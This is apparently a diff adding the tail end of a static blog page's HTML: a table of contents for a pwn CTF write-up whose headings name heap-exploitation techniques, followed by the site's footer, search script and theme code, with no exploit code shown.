+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Double"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Double</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ezheap"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">ezheap</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#exp1-mmap%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">exp1 - mmap泄露libc地址</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#exp2-leak-unsorted-bin%E5%BE%97%E5%88%B0main-arena%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">exp2  - leak unsorted_bin得到main_arena的地址</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#game"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">game</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#god-of-change"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">god_of_change</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#exp1"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">exp1</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#leak-libc"><span class="toc-nav-number">4.1.1.</span> <span class="toc-nav-text">leak libc</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%A6%86%E7%9B%96free-hook%E4%B8%BAsystem"><span class="toc-nav-number">4.1.2.</span> <span class="toc-nav-text">覆盖free_hook为system</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#exp2"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">exp2</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">参考文章</span></a></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">FEATURED TAGS</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+            
+          </div>
+        </section>
+        
+
+        <!-- Friends Blog -->
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
+
+
+		<!-- Footer (contains ThemeColor、viewer) -->
+		<!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center">
+          
+
+          
+            <li>
+              <a target="_blank" href="https://github.com/sgud4h5gh">
+                <span class="fa-stack fa-lg">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+        </ul>
+        <p class="copyright text-muted">
+          Copyright &copy;
+          sgud4h5gh
+          2023
+          <br>
+          Theme by
+          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
+          <span style="display: inline-block; margin: 0 5px;">
+            <i class="fa fa-heart"></i>
+          </span>
+          re-Ported by
+          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
+          |
+          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<a id="rocket" href="#top" class=""></a>
+
+
+  <!-- jQuery -->
+  <script type="text/javascript" src="/js/jquery.min.js"></script>
+  <!-- Bootstrap Core JavaScript -->
+  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
+  <!-- Custom Theme JavaScript -->
+  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
+  <!-- catalog -->
+  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
+  <!-- totop(rocket) -->
+  <script async="true" type="text/javascript" src="/js/totop.js"></script>
+
+  
+    <!-- Busuanzi JavaScript -->
+    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <!-- Scroll start -->
+    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
+    <!-- Scroll end -->
+  
+
+  
+    <!-- LangSelect start -->
+    <script type="text/javascript" src="/js/langselect.js"></script>
+    <!-- LangSelect end -->
+  
+
+  
+    <!-- Mouseclick -->
+    <script type="text/javascript" src="/js/mouseclick.js" content='The first step is as good as half over...,Laugh and grow fat...,Man proposes God disposes...,When all else is lost the future still remains...,Wasting time is robbing oneself...,Sharp tools make good work...,Cease to struggle and you cease to live...,A friend in need is a friend indeed...,Faith can move mountains...' color='#9933CC,#339933,#66CCCC,#FF99CC,#CCCCFF,#6666CC,#663399,#66CC99,#FF0033'></script>
+  
+
+  
+    <!-- ribbon -->
+    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
+  
+
+  
+
+
+
+
+
+
+  <!-- viewer start -->
+  <!-- viewer start (Picture preview) -->
+  
+    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
+    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
+  
+
+  <!-- viewer end -->
+
+
+<script>
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function (e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  // fastClick.js
+  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
+    var $nav = document.querySelector("nav");
+    if ($nav)
+      FastClick.attach($nav);
+    }
+  )
+</script>
+
+<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
+https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
+<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->
+
+<!-- jquery.tagcloud.js -->
+<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("http://yoursite-url/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
+start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->
+
+
+		<!-- Search -->
+		
+		<div class="popup search-popup local-search-popup">
+  <span class="popup-btn-close">
+    ESC
+  </span>
+  <div class="container">
+    <div class="row">
+      <!-- <div class="col-md-9 col-md-offset-1"> -->
+      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">
+
+        <div class="local-search-header clearfix">
+
+          <div class="local-search-input-wrapper">
+            <span class="search-icon">
+              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
+            </span>
+            <input autocomplete="off" placeholder="SEARCH..." type="text" id="local-search-input">
+          </div>
+        </div>
+        <div id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+  
+    <script src="/js/ziploader.js"></script>
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+    // get search zip version
+    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson() {
+      initLoad(['/search.flv'], {
+        loadOptions: {
+          success: function (obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function (e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions: {
+          'json': 'application/json'
+        }
+      })
+    }
+    // search function;
+    var searchFunc = function (search_id, content_id) {
+      'use strict';
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      // console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function () {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function (data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title
+              ? data.title.trim()
+              : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content
+              ? data.content.trim().replace(/<[^>]+>/g, "")
+              : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+
+            var date = data.date;
+            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
+            var imgUrl = data.header_img;
+            
+
+
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function (keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0,
+                  position = [],
+                  index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+            // show search results
+            if (isMatch) {
+              // sort index by position of keyword
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+              // merge hits into slices
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+                  // move to next position of hit
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
+              }
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if (start < 0) {
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if (end > content.length) {
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+              // sort slices in content by search text's count and hits' count
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+              // select top N slices in content
+              var upperBound = parseInt('1');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+              // highlight title and content
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+              var resultItem = '';
+
+              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
+              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
+              // "...</p></a>"; }); resultItem += "</li>";
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              } else {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              }
+              slicesOfContent.forEach(function (slice) {
+                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
+              });
+              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";
+
+              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
+            }
+          })
+        };
+
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<div class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</div>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+      // remove loading animation
+      $('body').css('overflow', '');
+      proceedsearch();
+    }
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function (e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function (e) {
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+
+    document.addEventListener('mouseup', (e) => {
+      var _con = document.querySelector(".local-search-content");
+      if (_con) {
+        if (!_con.contains(e.target)) {
+          onPopupClose();
+        }
+      }
+    });
+  </script>
+
+
+		
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
